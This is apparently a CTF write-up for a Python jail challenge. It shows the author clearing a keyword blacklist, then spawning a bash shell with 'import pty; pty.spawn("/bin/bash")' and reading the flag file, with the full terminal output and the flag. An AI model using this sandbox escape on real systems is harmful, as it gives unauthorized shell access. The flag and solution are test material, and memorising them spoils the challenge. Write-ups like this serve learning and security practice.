# "as" "df"
## Solution

Firstly I tried finding all the global variables, and there is an interesting variable named `blacklist` 

```python
(base) [hacker@hackerbook ~]$ nc fun.chall.seetf.sg 50002
Hello! Welcome to my amazing Python interpreter!
You can run anything you want, but take not, there's a few blacklists!
Flag is in the root directory, have fun!
Enter command: dir()
Enter command: print(dir())
['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'blacklist', 'sys', 'user_input']
Enter command: print(blacklist) 
('eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', ';', '+', 'ord', 'chr', 'base', 'flag', 'replace', ' ', 'decode', 'join')
Enter command: 
```

I thought, maybe if I cleared the variable, I could remove the blacklist entirely. This worked, as I could use the `import` keyword. I imported a library to spawn a bash shell and allow for Remote Code Execution.

```bash
(base) [hacker@hackerbook ~]$ nc fun.chall.seetf.sg 50002
Hello! Welcome to my amazing Python interpreter!
You can run anything you want, but take not, there's a few blacklists!
Flag is in the root directory, have fun!
Enter command: blacklist=()
Enter command: import pty; pty.spawn("/bin/bash")
random@app-8575d5795b-mqzr9:~$
```

I then used this bash shell to find the flag from the root directory, and display its contents using `cat`

```bash
random@app-8575d5795b-mqzr9:~$ cd /
cd /
random@app-8575d5795b-mqzr9:/$ ls
ls
bin   dev  flag  lib    media  opt   root  sbin  sys  usr
boot  etc  home  lib64  mnt    proc  run   srv   tmp  var
random@app-8575d5795b-mqzr9:/$ cat flag
cat flag
SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315}
random@app-8575d5795b-mqzr9:/$ 
```

## Flag
`SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315}`